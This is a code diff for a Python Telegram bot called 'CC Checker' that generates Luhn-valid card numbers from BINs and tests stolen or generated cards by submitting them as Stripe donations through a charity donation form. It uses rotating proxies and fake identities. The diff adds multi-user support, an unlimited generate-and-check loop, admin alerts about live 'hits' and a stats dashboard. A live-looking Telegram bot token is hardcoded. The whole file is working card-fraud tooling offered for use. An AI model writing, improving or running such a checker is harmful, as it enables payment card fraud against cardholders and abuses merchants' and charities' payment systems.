@@ -28,9 +28,21 @@ logging.basicConfig(
 
 # টেলিগ্রাম কনফিগারেশন
 TELEGRAM_TOKEN = "8483748146:AAH-Ft5YXtB1okTYt0bp27ovKhkrA3bnGyE"
-TELEGRAM_CHAT_ID = "6046372825"
+ADMIN_CHAT_ID = "6046372825" # রাখা হলো অ্যাডমিনকে আপডেট দেওয়ার জন্য
 
 bot = telebot.TeleBot(TELEGRAM_TOKEN)
+
+# Global Statistics
+STATS = {
+    "total_checked": 0,
+    "hits": 0,
+    "dead": 0,
+    "active_processes": 0,
+    "start_time": time.time()
+}
+
+# User specific control flags
+USER_PROCESSES = {} # {chat_id: {"checking": bool, "bingen": bool}}
 
 # User Agents and Proxy List
 USER_AGENTS = [
@@ -75,42 +87,57 @@ def proxy_refresher():
         fetch_proxies()
         time.sleep(600)  # Refresh every 10 minutes
 
-# Global control flags
+# Global control flags (Deprecated: use USER_PROCESSES)
 IS_CHECKING = True
 IS_BINGEN_ACTIVE = False
 
-def generate_cards(bin_number, count=10, month=None, year=None, cvc=None):
-    """ BIN থেকে র্যান্ডম কার্ড জেনারেট করে """
+def generate_cards(pattern, count=10, month=None, year=None, cvc=None):
+    """ BIN বা প্যাটার্ন থেকে র্যান্ডম কার্ড জেনারেট করে (e.g. 451101xxxxxx0xxx) """
     cards = []
-    bin_number = str(bin_number).replace(" ", "")[:6]
+    pattern = str(pattern).replace(" ", "").upper()
+    
+    if len(pattern) == 6 and pattern.isdigit():
+        pattern = pattern + "xxxxxxxxxx"
+    elif len(pattern) < 16:
+        pattern = pattern.ljust(16, "X")
+
     for _ in range(count):
-        number = bin_number
-        while len(number) < 15:
-            number += str(random.randint(0, 9))
+        number = list(pattern)
+        # Fill in X's for the first 15 digits
+        for i in range(min(len(number), 15)):
+            if number[i] == 'X':
+                number[i] = str(random.randint(0, 9))
         
-        # Luhn Algorithm check digit
-        digits = [int(d) for d in number]
-        for i in range(len(digits) - 1, -1, -2):
-            digits[i] *= 2
-            if digits[i] > 9:
-                digits[i] -= 9
-        total = sum(digits)
-        check_digit = (10 - (total % 10)) % 10
-        card_num = number + str(check_digit)
+        # If the 16th digit exists and is X, calculate Luhn
+        if len(number) >= 16 and number[15] == 'X':
+            temp_num = "".join(number[:15])
+            digits = [int(d) for d in temp_num]
+            # Use standard Luhn doubling (from right to left of the 15 digits)
+            # Index 14 (15th digit) -> no double, 13 -> double, 12 -> no double...
+            for i in range(len(digits) - 1, -1, -2):
+                digits[i] *= 2
+                if digits[i] > 9:
+                    digits[i] -= 9
+            total = sum(digits)
+            check_digit = (10 - (total % 10)) % 10
+            number[15] = str(check_digit)
+        elif len(number) >= 16 and number[15] == 'X':
+             # Fallback if anything weird happens
+             number[15] = str(random.randint(0, 9))
         
+        card_num = "".join(number)
         c_month = month if month else str(random.randint(1, 12)).zfill(2)
-        c_year = year if year else str(random.randint(2025, 2032))
+        c_year = year if year else str(random.randint(2025, 2030))
         c_cvc = cvc if cvc else str(random.randint(100, 999))
-        
         cards.append(f"{card_num}|{c_month}|{c_year}|{c_cvc}")
     return cards
 
-def send_telegram_msg(message):
-    """ টেলিগ্রামে মেসেজ পাঠায় """
+def send_telegram_msg(chat_id, message):
+    """ নির্দিষ্ট চ্যাট আইডিতে মেসেজ পাঠায় """
     try:
-        bot.send_message(TELEGRAM_CHAT_ID, message, parse_mode="Markdown")
+        bot.send_message(chat_id, message, parse_mode="Markdown")
     except Exception as e:
-        logging.error(f"Telegram Error: {e}")
+        logging.error(f"Telegram Error for {chat_id}: {e}")
 
 def create_stripe_payment_method(card_details):
     """ Stripe API ব্যবহার করে PM ID তৈরি করে। """
@@ -167,7 +194,6 @@ def process_donation(payment_method_id, user_info):
         "give_email": user_info['email'],
         "give_title": "Mr",
         "give_action": "purchase",
-        "give_ajax": "true",
     }
 
     proxy = get_random_proxy()
@@ -179,10 +205,12 @@ def process_donation(payment_method_id, user_info):
     except Exception as e:
         return f"ERROR: {str(e)}"
 
-def check_card(card_line):
+def check_card(card_line, chat_id):
     """ একটি একক কার্ড চেক করার ফাংশন। """
-    global IS_CHECKING
-    if not IS_CHECKING:
+    global STATS
+    
+    # User's checking state
+    if chat_id not in USER_PROCESSES or not USER_PROCESSES[chat_id].get("checking", False):
         return
 
     card_line = card_line.strip()
@@ -191,6 +219,9 @@ def check_card(card_line):
     
     try:
         parts = card_line.split("|")
+        # Handle cases with more or fewer parts if needed, but standard is 4
+        if len(parts) < 4: return
+        
         card = {
             "number": parts[0],
             "month": parts[1],
@@ -199,12 +230,11 @@ def check_card(card_line):
             "email": f"user_{int(time.time()*100)}@gmail.com"
         }
     except Exception:
-        logging.error(f"Invalid format: {card_line}")
         return
 
     user = {"first_name": "Jhon", "last_name": "Doe", "email": card['email']}
     
-    logging.info(f"Checking Card: {card['number']}")
+    STATS["total_checked"] += 1
     pm_id = create_stripe_payment_method(card)
     
     if pm_id:
@@ -223,30 +253,44 @@ def check_card(card_line):
                 "🤖 *Checked by:* @sbscc_bot\n"
                 "━━━━━━━━━━━━━━━━━━"
             )
-            logging.info(f"🔥 HIT! -> {card_line}")
-            send_telegram_msg(msg)
+            STATS["hits"] += 1
+            send_telegram_msg(chat_id, msg)
+            
+            # Optionally update admin
+            if str(chat_id) != str(ADMIN_CHAT_ID):
+                 send_telegram_msg(ADMIN_CHAT_ID, f"User {chat_id} got a hit! 🔥")
+
             with open("hits.txt", "a") as f:
-                f.write(f"{card_line} | Status: Success\n")
+                f.write(f"{card_line} | User: {chat_id}\n")
         else:
-            # logging.info(f"❌ DEAD -> {card_line} ({result})") # Muted as per request
+            STATS["dead"] += 1
             with open("dead.txt", "a") as f:
                 f.write(f"{card_line} | Reason: {result}\n")
     else:
-        # logging.info(f"❌ STRIPE DEAD -> {card_line}") # Muted as per request
+        STATS["dead"] += 1
         with open("dead.txt", "a") as f:
             f.write(f"{card_line} | Reason: Stripe Declined\n")
 
-def start_bulk_check(cards_list):
+def start_bulk_check(cards_list, chat_id, is_silent=False):
     """ মাল্টি-থ্রেডিং এ চেক শুরু করে। """
-    threads = 50  # Increased for faster simultaneous checking
-    logging.info(f"Total Cards to check: {len(cards_list)}")
-    send_telegram_msg(f"🚀 Checking Started...\nTotal Cards: {len(cards_list)}")
+    global STATS
+    threads = 50 
+    
+    if not is_silent:
+        send_telegram_msg(chat_id, f"🚀 *Checking Started...*\nTotal Cards: `{len(cards_list)}`")
+
+    # Ensure user is in USER_PROCESSES
+    if chat_id not in USER_PROCESSES:
+        USER_PROCESSES[chat_id] = {"checking": True, "bingen": False}
+    else:
+        USER_PROCESSES[chat_id]["checking"] = True
 
     with ThreadPoolExecutor(max_workers=threads) as executor:
-        executor.map(check_card, cards_list)
+        # Pass chat_id to check_card
+        executor.map(lambda c: check_card(c, chat_id), cards_list)
         
-    logging.info("--- Checking Completed ---")
-    send_telegram_msg("🏁 Checking Completed!")
+    if not is_silent:
+        send_telegram_msg(chat_id, "🏁 *Checking Completed!*")
 
 # টেলিগ্রাম বট হ্যান্ডলার
 @bot.message_handler(commands=['start'])
@@ -269,18 +313,17 @@ def welcome(message):
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
+    chat_id = message.chat.id
     if message.document.file_name.endswith('.txt'):
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
-        # ফাইল থেকে লাইন গুলো পড়া
         content = downloaded_file.decode('utf-8')
         lines = content.split('\n')
         valid_cards = [l.strip() for l in lines if "|" in l]
         
         if valid_cards:
-            bot.reply_to(message, f"📥 Received file: `{message.document.file_name}`\nFound {len(valid_cards)} cards. Starting check...")
-            threading.Thread(target=start_bulk_check, args=(valid_cards,), daemon=True).start()
+            threading.Thread(target=start_bulk_check, args=(valid_cards, chat_id), daemon=True).start()
         else:
             bot.reply_to(message, "❌ No valid cards found in the file.")
     else:
@@ -288,9 +331,10 @@ def handle_docs(message):
 
 @bot.message_handler(commands=['stop'])
 def stop_process(message):
-    global IS_CHECKING, IS_BINGEN_ACTIVE
-    IS_CHECKING = False
-    IS_BINGEN_ACTIVE = False
+    chat_id = message.chat.id
+    if chat_id in USER_PROCESSES:
+        USER_PROCESSES[chat_id]["checking"] = False
+        USER_PROCESSES[chat_id]["bingen"] = False
     bot.reply_to(message, "🛑 *Process Stopped Successfully!*", parse_mode="Markdown")
 
 @bot.message_handler(commands=['bin'])
@@ -308,49 +352,48 @@ def handle_bin(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {e}")
 
-def bingen_loop(bin_num):
-    global IS_CHECKING, IS_BINGEN_ACTIVE
-    IS_CHECKING = True
-    bot.send_message(TELEGRAM_CHAT_ID, f"🚀 *BinGen Started:* `{bin_num}`\nUnlimited checking active...", parse_mode="Markdown")
+def bingen_loop(bin_num, chat_id):
+    if chat_id not in USER_PROCESSES:
+        USER_PROCESSES[chat_id] = {"checking": True, "bingen": True}
+    else:
+        USER_PROCESSES[chat_id]["checking"] = True
+        USER_PROCESSES[chat_id]["bingen"] = True
+
+    send_telegram_msg(chat_id, f"🚀 *BinGen Started:* `{bin_num}`\nUnlimited checking active...\nUse `/stop` to end.")
     
-    while IS_BINGEN_ACTIVE and IS_CHECKING:
+    while USER_PROCESSES.get(chat_id, {}).get("bingen", False) and USER_PROCESSES.get(chat_id, {}).get("checking", False):
         cards = generate_cards(bin_num, count=50)
-        start_bulk_check(cards)
-        time.sleep(2) # Small delay between batches
+        start_bulk_check(cards, chat_id, is_silent=True)
+        time.sleep(1) # Small delay between batches
 
 @bot.message_handler(commands=['bingen'])
 def handle_bingen(message):
-    global IS_BINGEN_ACTIVE, IS_CHECKING
+    chat_id = message.chat.id
     try:
         parts = message.text.split()
         if len(parts) < 2:
-            bot.reply_to(message, "❌ Use: `/bingen 451101`", parse_mode="Markdown")
+            bot.reply_to(message, "❌ Use: `/bingen 451101` or `/bingen 451101xxxxxx0xxx`", parse_mode="Markdown")
             return
         
         bin_num = parts[1]
-        if IS_BINGEN_ACTIVE:
-            bot.reply_to(message, "⚠️ A BinGen process is already running. use `/stop` first.")
+        if USER_PROCESSES.get(chat_id, {}).get("bingen", False):
+            bot.reply_to(message, "⚠️ A BinGen process is already running for you. use `/stop` first.")
             return
             
-        IS_BINGEN_ACTIVE = True
-        IS_CHECKING = True
-        threading.Thread(target=bingen_loop, args=(bin_num,), daemon=True).start()
+        threading.Thread(target=bingen_loop, args=(bin_num, chat_id), daemon=True).start()
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {e}")
 
 @bot.message_handler(commands=['chk'])
 def handle_chk(message):
-    global IS_CHECKING
-    IS_CHECKING = True
+    chat_id = message.chat.id
     try:
-        # Extract cards from command (e.g., "/chk 4111..|11|2025|000")
         input_text = message.text.replace('/chk', '').strip()
         lines = input_text.split('\n')
         valid_cards = [l.strip() for l in lines if "|" in l]
         
         if valid_cards:
-            bot.reply_to(message, f"📥 Received {len(valid_cards)} cards via /chk. Starting check...")
-            threading.Thread(target=start_bulk_check, args=(valid_cards,), daemon=True).start()
+            threading.Thread(target=start_bulk_check, args=(valid_cards, chat_id), daemon=True).start()
         else:
             bot.reply_to(message, "❌ Invalid format. Use: `/chk number|month|year|cvc`", parse_mode="Markdown")
     except Exception as e:
@@ -358,16 +401,16 @@ def handle_chk(message):
 
 @bot.message_handler(func=lambda message: True)
 def handle_cards(message):
-    global IS_CHECKING
-    IS_CHECKING = True # Reset stop flag if new list sent
+    chat_id = message.chat.id
     lines = message.text.split('\n')
     valid_cards = [l.strip() for l in lines if "|" in l]
     
     if valid_cards:
-        bot.reply_to(message, f"📥 Received {len(valid_cards)} cards. Starting check...")
-        threading.Thread(target=start_bulk_check, args=(valid_cards,), daemon=True).start()
+        threading.Thread(target=start_bulk_check, args=(valid_cards, chat_id), daemon=True).start()
     else:
-        bot.reply_to(message, "❌ Invalid format. Please use: `number|month|year|cvc`")
+        # Optional: only reply if it looks like a card list attempt but failed
+        if "|" in message.text:
+             bot.reply_to(message, "❌ Invalid format. Please use: `number|month|year|cvc`")
 
 def run_bot():
     logging.info("Telegram Bot Polling Started...")
@@ -375,32 +418,32 @@ def run_bot():
 
 @app.route('/health')
 def health():
-    html_template = """
+    uptime = int(time.time() - STATS["start_time"])
+    hours, remainder = divmod(uptime, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    uptime_str = f"{hours}h {minutes}m {seconds}s"
+
+    html_template = f"""
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>CC Checker | System Status</title>
+        <title>CC Checker | Pro Dashboard</title>
         <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
         <style>
-            :root {
+            :root {{
                 --primary: #c084fc;
                 --secondary: #6366f1;
                 --bg: #030712;
                 --card-bg: rgba(17, 24, 39, 0.7);
                 --text: #f9fafb;
                 --success: #22c55e;
-            }
+            }}
 
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-                font-family: 'Outfit', sans-serif;
-            }
+            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }}
 
-            body {
+            body {{
                 background: var(--bg);
                 background-image: 
                     radial-gradient(circle at 20% 20%, rgba(99, 102, 241, 0.15) 0%, transparent 40%),
@@ -410,188 +453,83 @@ def health():
                 display: flex;
                 justify-content: center;
                 align-items: center;
-                overflow: hidden;
-            }
+                padding: 20px;
+            }}
 
-            .container {
-                width: 90%;
-                max-width: 800px;
-                position: relative;
-                z-index: 1;
-            }
+            .container {{ width: 100%; max-width: 900px; position: relative; z-index: 1; }}
 
-            .glass-card {
+            .glass-card {{
                 background: var(--card-bg);
                 backdrop-filter: blur(12px);
-                -webkit-backdrop-filter: blur(12px);
                 border: 1px solid rgba(255, 255, 255, 0.1);
                 border-radius: 24px;
-                padding: 3rem;
+                padding: 2.5rem;
                 box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
                 animation: fadeIn 0.8s ease-out;
-            }
+            }}
 
-            @keyframes fadeIn {
-                from { opacity: 0; transform: translateY(20px); }
-                to { opacity: 1; transform: translateY(0); }
-            }
+            @keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(20px); }} to {{ opacity: 1; transform: translateY(0); }} }}
 
-            .header {
-                text-align: center;
-                margin-bottom: 3rem;
-            }
+            .header {{ text-align: center; margin-bottom: 2.5rem; }}
+            .logo-orb {{
+                width: 70px; height: 70px; background: linear-gradient(135deg, var(--primary), var(--secondary));
+                border-radius: 50%; margin: 0 auto 1rem; display: flex; justify-content: center; align-items: center;
+                font-size: 1.8rem; box-shadow: 0 0 30px rgba(99, 102, 241, 0.4);
+            }}
 
-            .logo-orb {
-                width: 80px;
-                height: 80px;
-                background: linear-gradient(135deg, var(--primary), var(--secondary));
-                border-radius: 50%;
-                margin: 0 auto 1.5rem;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                font-size: 2rem;
-                box-shadow: 0 0 30px rgba(99, 102, 241, 0.4);
-                animation: pulse 2s infinite;
-            }
+            h1 {{ font-size: 2.2rem; font-weight: 800; background: linear-gradient(to right, #fff, #9ca3af); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
 
-            @keyframes pulse {
-                0% { box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.4); }
-                70% { box-shadow: 0 0 0 20px rgba(99, 102, 241, 0); }
-                100% { box-shadow: 0 0 0 0 rgba(99, 102, 241, 0); }
-            }
+            .status-badge {{
+                display: inline-flex; align-items: center; gap: 0.5rem; background: rgba(34, 197, 94, 0.1);
+                color: var(--success); padding: 0.4rem 1rem; border-radius: 100px; font-size: 0.75rem; font-weight: 600; border: 1px solid rgba(34, 197, 94, 0.2);
+            }}
 
-            h1 {
-                font-size: 2.5rem;
-                font-weight: 800;
-                background: linear-gradient(to right, #fff, #9ca3af);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-                margin-bottom: 0.5rem;
-            }
+            .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1.2rem; margin-top: 1.5rem; }}
 
-            .status-badge {
-                display: inline-flex;
-                align-items: center;
-                gap: 0.5rem;
-                background: rgba(34, 197, 94, 0.1);
-                color: var(--success);
-                padding: 0.5rem 1rem;
-                border-radius: 100px;
-                font-size: 0.875rem;
-                font-weight: 600;
-                border: 1px solid rgba(34, 197, 94, 0.2);
-            }
+            .stat-item {{
+                background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05);
+                padding: 1.5rem; border-radius: 16px; transition: all 0.3s ease; text-align: center;
+            }}
+            .stat-item:hover {{ background: rgba(255, 255, 255, 0.05); transform: translateY(-3px); border-color: var(--primary); }}
 
-            .status-dot {
-                width: 8px;
-                height: 8px;
-                background: var(--success);
-                border-radius: 50%;
-                box-shadow: 0 0 10px var(--success);
-            }
+            .stat-label {{ color: #9ca3af; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.4rem; }}
+            .stat-value {{ font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; color: #fff; }}
+            .stat-value.hits {{ color: #22c55e; }}
+            .stat-value.dead {{ color: #ef4444; }}
 
-            .stats-grid {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-                gap: 1.5rem;
-                margin-top: 2rem;
-            }
-
-            .stat-item {
-                background: rgba(255, 255, 255, 0.03);
-                border: 1px solid rgba(255, 255, 255, 0.05);
-                padding: 1.5rem;
-                border-radius: 16px;
-                transition: all 0.3s ease;
-            }
-
-            .stat-item:hover {
-                background: rgba(255, 255, 255, 0.05);
-                transform: translateY(-5px);
-                border-color: rgba(255, 255, 255, 0.1);
-            }
-
-            .stat-label {
-                color: #9ca3af;
-                font-size: 0.75rem;
-                text-transform: uppercase;
-                letter-spacing: 0.1em;
-                margin-bottom: 0.5rem;
-            }
-
-            .stat-value {
-                font-family: 'JetBrains Mono', monospace;
-                font-size: 1.25rem;
-                font-weight: 600;
-                color: var(--primary);
-            }
-
-            .footer-info {
-                text-align: center;
-                margin-top: 3rem;
-                color: #6b7280;
-                font-size: 0.875rem;
-            }
-
-            .floating-blobs {
-                position: absolute;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                overflow: hidden;
-                z-index: 0;
-            }
-
-            .blob {
-                position: absolute;
-                background: linear-gradient(135deg, var(--secondary), var(--primary));
-                filter: blur(80px);
-                border-radius: 50%;
-                opacity: 0.2;
-                animation: float 20s infinite alternate;
-            }
-
-            @keyframes float {
-                from { transform: translate(0, 0); }
-                to { transform: translate(100px, 100px); }
-            }
+            .footer-info {{ text-align: center; margin-top: 2.5rem; color: #6b7280; font-size: 0.8rem; }}
         </style>
+        <script>setTimeout(() => location.reload(), 10000);</script>
     </head>
     <body>
-        <div class="floating-blobs">
-            <div class="blob" style="width: 400px; height: 400px; top: -100px; left: -100px;"></div>
-            <div class="blob" style="width: 500px; height: 500px; bottom: -200px; right: -200px; animation-delay: -5s;"></div>
-        </div>
-
         <div class="container">
             <div class="glass-card">
                 <div class="header">
                     <div class="logo-orb">⚡</div>
-                    <h1>System Health</h1>
-                    <div class="status-badge">
-                        <div class="status-dot"></div>
-                        CORE SYSTEMS OPERATIONAL
-                    </div>
+                    <h1>System Dashboard</h1>
+                    <div class="status-badge">ONLINE & OPERATIONAL</div>
                 </div>
 
                 <div class="stats-grid">
                     <div class="stat-item">
-                        <div class="stat-label">Service Name</div>
-                        <div class="stat-value">CC Checker Pro</div>
+                        <div class="stat-label">Total Checked</div>
+                        <div class="stat-value">{STATS['total_checked']}</div>
                     </div>
                     <div class="stat-item">
-                        <div class="stat-label">Response Time</div>
-                        <div class="stat-value" id="ping">-- ms</div>
+                        <div class="stat-label">Total Hits</div>
+                        <div class="stat-value hits">{STATS['hits']}</div>
                     </div>
                     <div class="stat-item">
-                        <div class="stat-label">Bot Status</div>
-                        <div class="stat-value">Active Online</div>
+                        <div class="stat-label">Total Dead</div>
+                        <div class="stat-value dead">{STATS['dead']}</div>
                     </div>
                     <div class="stat-item">
-                        <div class="stat-label">Environment</div>
-                        <div class="stat-value">Render Production</div>
+                        <div class="stat-label">Active Users</div>
+                        <div class="stat-value">{len(USER_PROCESSES)}</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Uptime</div>
+                        <div class="stat-value" style="font-size: 1rem;">{uptime_str}</div>
                     </div>
                 </div>
 
@@ -600,15 +538,6 @@ def health():
                 </div>
             </div>
         </div>
-
-        <script>
-            // Simulate dynamic values
-            const start = Date.now();
-            window.onload = () => {
-                const duration = Date.now() - start;
-                document.getElementById('ping').innerText = duration + ' ms';
-            };
-        </script>
     </body>
     </html>
     """
@@ -627,7 +556,7 @@ if __name__ == "__main__":
         with open("cards.txt", "r") as f:
             initial_cards = [l.strip() for l in f.readlines() if "|" in l]
             if initial_cards:
-                threading.Thread(target=start_bulk_check, args=(initial_cards,), daemon=True).start()
+                threading.Thread(target=start_bulk_check, args=(initial_cards, ADMIN_CHAT_ID), daemon=True).start()
     
     # Flask সার্ভার রান করা হচ্ছে
     app.run(host='0.0.0.0', port=port)
